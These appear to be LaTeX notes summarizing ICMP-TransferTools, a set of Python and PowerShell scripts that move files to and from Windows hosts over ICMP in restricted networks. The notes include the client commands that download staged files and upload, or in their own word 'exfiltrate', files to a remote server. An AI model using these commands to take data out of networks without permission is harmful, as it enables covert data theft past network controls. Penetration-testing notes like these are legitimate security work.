%https://github.com/icyguider/ICMP-TransferTools/tree/main
%https://learn.microsoft.com/en-us/windows/win32/api/icmpapi/
%https://learn.microsoft.com/en-us/windows/win32/api/icmpapi/nf-icmpapi-icmpsendecho2
%https://learn.microsoft.com/en-us/windows/win32/api/icmpapi/nf-icmpapi-icmpsendecho

\section{ICMP-TransferTools}
ICMP-TransferTools is a set of scripts designed to move files to and from Windows hosts in restricted network environments. 
This is accomplished using a total of 4 different files, consisting of a python server and powershell client for each transfer direction (Download & Upload).
\vspace{1ex} \newline
The only dependency required is Impacket for one of the python scripts. It can be installed via pip like so:
pip3 install impacket
\vspace{2ex} \newline 
The included ICMP-SendFile.py and Invoke-IcmpDownload.ps1 scripts can be used to download a file to a Windows host via ICMP.
\vspace{1ex} \newline
The python server must be run first to stage the file for download.
\vspace{2ex} \newline
Once imported, the powershell client can then be used to download the staged file like so:
Invoke-IcmpDownload PublicIPAddressOfServer FileToDownload
\vspace{2ex} \newline 
The included ICMP-ReceiveFile.py and Invoke-IcmpUpload.ps1 scripts can be used to upload/exfiltrate a file from a Windows host via ICMP.
\vspace{1ex} \newline
The python server must be run first to ensure it's ready to accept requests from the client.
Once imported, the powershell client can then be used to upload the desired file like so:
Invoke-IcmpUpload PublicIPAddressOfServer FileToUpload








